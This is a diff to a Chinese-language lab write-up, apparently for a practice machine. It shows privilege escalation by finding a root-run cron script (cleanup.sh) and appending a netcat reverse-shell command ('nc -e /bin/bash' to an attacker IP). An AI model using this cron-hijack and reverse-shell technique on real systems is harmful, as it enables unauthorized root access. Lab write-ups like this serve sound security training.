@@ -95,28 +95,54 @@ wget http://192.168.45.161:8888/linpeas.sh
 
 <figure><img src="../.gitbook/assets/17 (8).png" alt=""><figcaption></figcaption></figure>
 
-*
+* 执行linpeas.sh脚本后，虽然没有找到可以直接利用的凭证信息，但是也发现了以下两处都出现了/var/www/目录下的<mark style="color:red;">**cleanup.sh文件**</mark>：
 
+<figure><img src="../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
 
+* 这部分意味着以下文件可以由非root用户创建和修改：
+
+<figure><img src="../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+
+* 这部分意味着当前的用户权限对以下文件是有写入权限的：
+
+<figure><img src="../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
-*
+* 回到/var/www/目录下，查看cleanup.sh文件内容，发现是一个用于删除log日志的脚本文件，大概率和计划任务有关联：
 
+<figure><img src="../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
 
+* 查看计划任务：
 
+<figure><img src="../.gitbook/assets/22.png" alt=""><figcaption></figcaption></figure>
 
+* 在linpeas的输出信息中发现设置了一个用于定时清理的计时器：phpsessionclean.timer
 
+<figure><img src="../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>
 
+* 在阅读/cron.d目录中的php文件内容时，里面也设置了每第9分钟和第39分钟的时候以root身份运行一次sessionclean文件：
+
+<figure><img src="../.gitbook/assets/24.png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
+* 由此，当我们可以以低权限账户来修改cleanup.sh的内容时，直接写入反弹shell的命令，然后等待计划任务自动执行，即可获取到shell：
 
+```bash
+echo 'nc -e /bin/bash 192.168.45.161 9999' >> cleanup.sh
+```
 
+<figure><img src="../.gitbook/assets/25.png" alt=""><figcaption></figcaption></figure>
 
+* 在Kali本机做好监听，等待即可：
 
+<figure><img src="../.gitbook/assets/26.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/27.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例get shell阶段当找不到漏洞利用的默认路径时，以为掉进了“兔子洞”，心态有点崩，但是因为该机器开放端口只有两个，在没有任何有效凭证的情况下，只有80端口是切入点，因此只要冷静下来尝试多修改几次脚本中的URI，就能利用成功。
+
+利用计划任务进行提权的本质是，找到目标系统中可以让低权限
 {% endhint %}
